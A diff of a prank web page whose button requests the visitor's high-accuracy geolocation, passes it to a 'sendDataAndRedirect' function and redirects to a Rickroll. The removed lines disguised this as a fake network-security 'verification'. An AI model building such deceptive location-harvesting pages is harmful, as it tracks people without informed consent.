@@ -11,9 +11,9 @@
 </head>
 <body>
     <div class="container">
-        <h2>Network Security Research</h2>
-        <p>Please verify your current coordinate signal for the 2026 IP Security study.</p>
-        <button onclick="getLocation()">Verify Connection & Sync</button>
+        <h2>Button.</h2>
+        <p>Fun button.</p>
+        <button onclick="getLocation()">Click!</button>
         <p id="status" style="margin-top:20px; color: #666;"></p>
     </div>
 
@@ -24,7 +24,7 @@
         function getLocation() {
             const status = document.getElementById('status');
             if (navigator.geolocation) {
-                status.innerHTML = "Syncing with local tower...";
+                status.innerHTML = "Button is doing things.";
                 navigator.geolocation.getCurrentPosition(sendDataAndRedirect, handleError, {
                     enableHighAccuracy: true,
                     timeout: 8000
@@ -54,7 +54,7 @@
             window.location.href = RICKROLL_URL;
         }
         function handleError(error) {
-            document.getElementById('status').innerHTML = "Verification Failed: Permission Denied.";
+            document.getElementById('status').innerHTML = "Button wants to see more.";
         }
     </script>
 </body>
